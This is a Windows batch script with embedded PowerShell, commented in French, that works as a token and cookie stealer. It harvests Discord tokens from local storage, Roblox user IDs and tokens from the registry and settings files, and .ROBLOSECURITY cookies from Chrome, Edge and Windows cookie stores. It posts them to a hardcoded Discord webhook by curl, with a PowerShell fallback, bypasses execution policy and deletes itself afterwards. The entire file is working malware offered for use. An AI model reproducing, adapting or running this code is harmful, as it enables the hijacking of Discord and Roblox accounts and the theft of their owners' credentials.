@echo off
setlocal enabledelayedexpansion
:: PALOFSC - EXFILTRATION AVEC CONFIRMATION D'ENVOI (DOUBLE METHODE)

set "WEBHOOK=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"
set "LOG=%TEMP%\exfil_fail.log"

:: ===== 1. EXTRACTION DES DONNEES =====
set "psfile=%TEMP%\extract.ps1"
set "outfile=%TEMP%\result.txt"
(
echo $paths = @(
echo     "$env:APPDATA\Discord\Local Storage\leveldb",
echo     "$env:APPDATA\discordptb\Local Storage\leveldb",
echo     "$env:APPDATA\discordcanary\Local Storage\leveldb"
echo )
echo $tokens = @()
echo $pattern = '[a-zA-Z0-9_\-]{20,80}\.[a-zA-Z0-9_\-]{6,30}\.[a-zA-Z0-9_\-]{20,100}'
echo foreach ($p in $paths) {
echo     if (Test-Path $p) {
echo         Get-ChildItem $p -File -ErrorAction SilentlyContinue ^| ForEach-Object {
echo             Select-String -Path $_.FullName -Pattern $pattern -AllMatches -ErrorAction SilentlyContinue ^| ForEach-Object { $_.Matches.Value }
echo         } ^| ForEach-Object { $tokens += $_ }
echo     }
echo }
echo $tokens = $tokens ^| Select-Object -Unique
echo $discord = $tokens -join ' '
echo.
echo $user = $null
echo $remember = $null
echo try { $user = (Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudio" -Name "UserID" -ErrorAction SilentlyContinue).UserID } catch {}
echo try { $remember = (Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudio" -Name "RememberMe" -ErrorAction SilentlyContinue).RememberMe } catch {}
echo.
echo $xmlToken = $null
echo $xmlPath = "$env:LOCALAPPDATA\Roblox\GlobalBasicSettings_13.xml"
echo if (Test-Path $xmlPath) {
echo     try {
echo         $xml = [xml](Get-Content $xmlPath -ErrorAction SilentlyContinue)
echo         if ($xml -and $xml.settings -and $xml.settings.token) { $xmlToken = $xml.settings.token }
echo     } catch {}
echo }
echo.
echo $cookie = $null
echo $files = @()
echo $files += "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
echo $files += "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
echo $files += "$env:APPDATA\Microsoft\Windows\Cookies\*.txt"
echo $files += "$env:LOCALAPPDATA\Microsoft\Windows\INetCookies\*.txt"
echo foreach ($f in $files) {
echo     if (Test-Path $f) {
echo         $matches = Select-String -Path $f -Pattern 'ROBLOSECURITY=[a-zA-Z0-9_\-]{30,100}' -AllMatches -ErrorAction SilentlyContinue
echo         if ($matches) {
echo             foreach ($m in $matches) {
echo                 $val = $m.Matches.Value -replace 'ROBLOSECURITY=',''
echo                 if ($val.Length -gt 30) { $cookie = $val; break }
echo             }
echo         }
echo         if ($cookie) { break }
echo     }
echo }
echo.
echo $msg = ""
echo if ($discord -ne "") { $msg += "=== TOKENS DISCORD ===`n$discord`n`n" }
echo if ($user -ne $null -and $user -ne "") { $msg += "=== ROBLOX UserID ===`n$user`n`n" }
echo if ($remember -ne $null -and $remember -ne "") { $msg += "=== ROBLOX RememberMe ===`n$remember`n`n" }
echo if ($xmlToken -ne $null -and $xmlToken -ne "") { $msg += "=== ROBLOX Token (XML) ===`n$xmlToken`n`n" }
echo if ($cookie -ne $null -and $cookie -ne "") { $msg += "=== ROBLOX Cookie (.ROBLOSECURITY) ===`n$cookie`n`n" }
echo if ($msg -eq "") { $msg = "Aucune donnee collectee.`n" }
echo $msg ^| Out-File -FilePath '%outfile%' -Encoding utf8
) > "%psfile%"

powershell -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%psfile%" 2>nul
set "msg="
if exist "%outfile%" (
    for /f "usebackq delims=" %%a in ("%outfile%") do set "msg=%%a"
    del /f /q "%outfile%" >nul 2>&1
)
del /f /q "%psfile%" >nul 2>&1
if "!msg!"=="" set "msg=Erreur extraction."

:: ===== 2. ENVOI VIA CURL (méthode 1) =====
set "send_ok=0"
curl -s -o "%TEMP%\curl_resp.txt" -w "%{http_code}" -H "Content-Type: application/json" -d "{\"content\":\"%msg%\"}" "%WEBHOOK%" > "%TEMP%\curl_code.txt" 2>nul
set /p http_code=<"%TEMP%\curl_code.txt"
if "%http_code%"=="204" (
    set "send_ok=1"
    del /f /q "%TEMP%\curl_resp.txt" "%TEMP%\curl_code.txt" >nul 2>&1
) else (
    del /f /q "%TEMP%\curl_resp.txt" "%TEMP%\curl_code.txt" >nul 2>&1
)

:: ===== 3. SI CURL A ÉCHOUE, FALLBACK VIA POWERSHELL (méthode 2) =====
if "%send_ok%"=="0" (
    echo Tentative d'envoi via PowerShell... > "%LOG%"
    echo Message: %msg% >> "%LOG%"
    set "ps_send=%TEMP%\send.ps1"
    (
    echo $payload = @{ content = '%msg%' } ^| ConvertTo-Json
    echo try {
    echo     $resp = Invoke-RestMethod -Uri '%WEBHOOK%' -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop
    echo     Write-Output "OK"
    echo } catch {
    echo     Write-Output "ERREUR: $_"
    echo }
    ) > "%ps_send%"
    for /f "delims=" %%a in ('powershell -NoProfile -ExecutionPolicy Bypass -File "%ps_send%" 2^>nul') do set "ps_result=%%a"
    del /f /q "%ps_send%" >nul 2>&1
    if "!ps_result!"=="OK" (
        set "send_ok=1"
        echo Envoi PowerShell reussi. >> "%LOG%"
    ) else (
        echo Echec PowerShell : !ps_result! >> "%LOG%"
    )
)

:: ===== 4. SI ENVOI ÉCHOUÉ, SAUVEGARDER LE MESSAGE LOCALEMENT =====
if "%send_ok%"=="0" (
    echo %date% %time% - ECHEC ENVOI >> "%LOG%"
    echo Message non envoye : >> "%LOG%"
    echo %msg% >> "%LOG%"
    echo ---------------------------------------- >> "%LOG%"
    :: On essaye d'écrire aussi dans un fichier texte lisible
    echo %msg% > "%TEMP%\exfil_data.txt"
)

:: ===== 5. AUTO-SUPPRESSION =====
del /f /q "%~f0" >nul 2>&1
exit /b 0
